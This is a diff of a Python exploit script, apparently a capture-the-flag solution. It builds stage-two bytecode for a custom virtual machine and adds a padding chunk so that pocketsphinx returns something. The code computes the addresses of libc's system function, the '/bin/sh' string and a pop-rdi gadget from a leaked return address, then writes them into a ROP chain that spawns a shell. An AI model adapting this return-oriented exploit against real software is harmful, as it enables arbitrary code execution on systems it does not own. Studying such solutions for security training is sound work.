@@ -119,33 +119,27 @@ def mk_stage2():
     def push(v):
         code.append(v + 10)
 
-    # Load return address onto stack
+    # Load return address into __libc_start_main
     push(33779)
     load(0)
-    # Add offset to return address
+    # Add offset
     push(offset_system - offset___libc_start_main_ret)
     add()
-    # Store new address to return address
+    # Store new address inside ROP chain
     push(33781)
     store()
 
-    # Load return address onto stack
     push(33779)
     load(0)
-    # Add offset to return address
     push(offset_str_bin_sh - offset___libc_start_main_ret)
     add()
-    # Store new address to return address
     push(33780)
     store()
 
-    # Load return address onto stack
     push(33779)
     load(0)
-    # Add offset to return address
     push(offset_pop_rdi - offset___libc_start_main_ret)
     add()
-    # Store new address to return address
     push(33779)
     store()
 
@@ -153,6 +147,9 @@ def mk_stage2():
     exit()
 
     chunk = ''.join(map(lambda x: struct.pack('<Q', x), code))
+
+    # we need to append some more data so that pocketsphinx detects something and
+    # does not return NULL. Not sure why, but apparently random data seems to work.
     chunk += pack_chunk(get_sound(1))
     return pack_chunk(chunk)
 
